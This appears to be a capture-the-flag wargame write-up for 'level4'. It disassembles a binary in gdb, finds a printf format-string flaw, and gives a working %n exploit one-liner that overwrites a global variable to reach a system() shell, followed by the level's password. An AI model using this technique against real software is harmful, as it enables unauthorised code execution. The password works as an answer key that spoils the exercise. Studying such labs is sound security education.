We notice that this level looks a lot like the previous one.

We notice that the `p` function contains a printf on which we can do a format string exploit, and that the `n` function contains an `if ` condition that opens a shell. 

To enter in this condition, we have to pass the value `0x1025544`, which makes 16930116 in decimal.

We look in gdb to see where to write :

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	    push   %ebp
   0x08048458 <+1>:	    mov    %esp,%ebp
   0x0804845a <+3>:	    sub    $0x218,%esp
   0x08048460 <+9>:	    mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
```

Right before the `CMP` operation, we have this line that assignes a value to `eax` :

`  0x0804848d <+54>:	mov    0x8049810,%eax`

`0x8049810` is the address where we have to write.

We write our exploit : 

`(python -c 'print "\x10\x98\x04\x08%16930112x%12$n"') | ./level4`


The address where we want to write + the padding of 16930116 - 4 bytes of the address + writing this in the 12th argument

The pass is : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`